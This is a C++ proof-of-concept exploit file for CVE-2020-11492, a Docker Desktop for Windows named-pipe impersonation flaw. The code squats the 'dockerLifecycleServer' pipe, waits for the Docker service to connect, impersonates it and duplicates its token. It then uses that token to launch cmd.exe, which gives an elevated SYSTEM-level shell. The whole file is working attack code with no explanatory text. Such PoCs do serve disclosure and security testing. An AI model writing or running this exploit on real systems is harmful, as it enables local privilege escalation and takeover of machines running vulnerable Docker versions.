// CVE-2020-11492.cpp : PoC for docker named-pipe impersonation CVE.
//

#include <windows.h>
#include <iostream>
#include <AclAPI.h>

int main()
{
    SECURITY_ATTRIBUTES security_attrs = {
        sizeof(SECURITY_ATTRIBUTES),
        NULL,                               // assigned access token of calling process
        FALSE
    };

    DWORD open_mode = PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE | WRITE_OWNER;
    DWORD pipe_mode = PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT;

    std::cout << "[+] creating pipe server\n";
    for (;;) {
        // create the named pipe
        HANDLE pipe = NULL;
        pipe = CreateNamedPipeA(
            "\\\\.\\pipe\\dockerLifecycleServer",
            open_mode,
            pipe_mode,
            1,          // max instances
            1024,       // out buffer size
            1024,       // in buffer size
            0,          // timeout. 0 ~= 50ms
            &security_attrs);

        if (pipe == INVALID_HANDLE_VALUE) {
            DWORD err = GetLastError();
            std::cout << "[!] pipe creation failed! " << err << std::endl;
            return err;
        }

        // wait for docker to connect to the client
        std::cout << "[+] waiting for docker to connect\n";
        bool connected = ConnectNamedPipe(pipe, NULL) ? true : (
            GetLastError() == ERROR_PIPE_CONNECTED);
        if (!connected)
            continue;
        std::cout << "[+] client connected\n";

        // read byte from pipe
        char buf[1024];
        DWORD bytesread = 0;
        bool status = ReadFile(
            pipe,
            &buf,
            1024,
            &bytesread,
            NULL);

        // impersoante the connector
        status = ImpersonateNamedPipeClient(pipe);
        if (!status) {
            DWORD err = GetLastError();
            std::cout << "[!] impersonation failed! " << err << std::endl;
            return -1;
        }
        std::cout << "[+] docker impersonated!\n";

        HANDLE current_process = GetCurrentProcess();
        HANDLE token = {};
        /*status = OpenProcessToken(current_process, TOKEN_ALL_ACCESS, &token);
        if (!status) {
            DWORD err = GetLastError();
            std::cout << "[!] failed to get process token! " << err << std::endl;
            return err;
        }*/

        if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, &token)) {
            DWORD err = GetLastError();
            std::cout << "[!] Failed to get thread token! " << err << std::endl;
            return err;
        }
        

        SECURITY_IMPERSONATION_LEVEL impersonation_level = SecurityImpersonation;
        HANDLE new_token = new HANDLE;
        if (!DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, impersonation_level, TokenPrimary, &new_token)) {
            DWORD err = GetLastError();
            std::cout << "[!] could not duplicate token! " << err << std::endl;
            return err;
        }
        std::cout << "[+] docker token has been duplicated\n";

        // launch a new process with the connector's token
        PROCESS_INFORMATION process_info = {};
        STARTUPINFOW startup_info = {};
        GetStartupInfoW(&startup_info);

        if (status) {
            if (!&startup_info) {
                return GetLastError();
            }

            HANDLE threadToken = GetCurrentThreadToken();
            std::cout << "[+] launching process with token " << token << std::endl;
            if (!CreateProcessWithTokenW(
                new_token,
                0,
                L"C:\\Windows\\System32\\cmd.exe",
                NULL,                   // command line args      
                CREATE_NEW_CONSOLE,     // creation flags
                NULL,                   // environment block
                NULL,                   // current directory
                &startup_info,          // startup info
                &process_info            // process info
                )) 
            {
                DWORD err = GetLastError();
                std::cout << "[-] failed to open new process with SYSTEM token" << err << std::endl;
                return err;
            }

            std::cout << "[+] process created with new token\n";
            break;
        }
    }
}